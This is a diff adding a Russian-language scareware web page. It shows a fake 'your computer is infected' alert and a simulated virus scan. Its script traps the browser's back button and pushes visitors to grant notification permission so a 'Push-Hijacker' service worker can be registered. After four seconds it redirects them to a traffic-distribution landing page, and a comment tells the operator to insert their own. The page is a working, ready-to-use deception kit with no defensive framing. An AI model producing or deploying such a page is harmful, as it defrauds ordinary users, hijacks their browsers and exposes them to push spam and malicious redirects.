@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ CRITICAL SYSTEM ALERT</title>
+    <style>
+        body {
+            margin: 0; padding: 40px;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(#110000, #330000);
+            color: #ffdddd;
+            text-align: center;
+            height: 100vh;
+        }
+        h1 { font-size: 2.8em; color: #ff2222; text-shadow: 0 0 20px red; }
+        .scan { font-size: 22px; margin: 30px 0; }
+        #progress { color: #00ff00; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>🚨 ВАШ КОМПЬЮТЕР ЗАРАЖЁН!</h1>
+    <h2>Обнаружено 5 критических вирусов</h2>
+    <p>Разрешите уведомления для автоматической очистки</p>
+    
+    <div class="scan">
+        Сканирование системы: <span id="progress">73%</span>
+    </div>
+
+    <script>
+        // 1. History trap (блокировка кнопки Назад)
+        function trapBack() {
+            for (let i = 0; i < 15; i++) {
+                history.pushState({page: i}, '', location.href + '#trap' + i);
+            }
+            window.addEventListener('popstate', () => history.forward());
+        }
+
+        // 2. Notification hijack
+        async function hijack() {
+            if (!('Notification' in window)) return;
+            const perm = await Notification.requestPermission();
+            if (perm === 'granted') registerSW();
+        }
+
+        // 3. Register Service Worker
+        async function registerSW() {
+            if (!('serviceWorker' in navigator)) return;
+            try {
+                const reg = await navigator.serviceWorker.register('/sw.js', {scope: '/'});
+                console.log('✅ Push-Hijacker SW registered');
+            } catch (e) { console.error(e); }
+        }
+
+        // 4. TDS redirect через 4 секунды (в любом случае)
+        function tdsRedirect() {
+            // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+            window.location.replace('https://example.com'); // ← Замени на свой TDS-лендинг
+        }
+
+        // Init
+        window.onload = () => {
+            trapBack();
+            hijack();
+            setTimeout(tdsRedirect, 4000);
+
+            // Fake progress
+            let p = 73;
+            setInterval(() => {
+                p = Math.min(99, p + Math.random() * 7);
+                document.getElementById('progress').textContent = Math.floor(p) + '%';
+            }, 280);
+        };
+    </script>
+</body>
+</html>
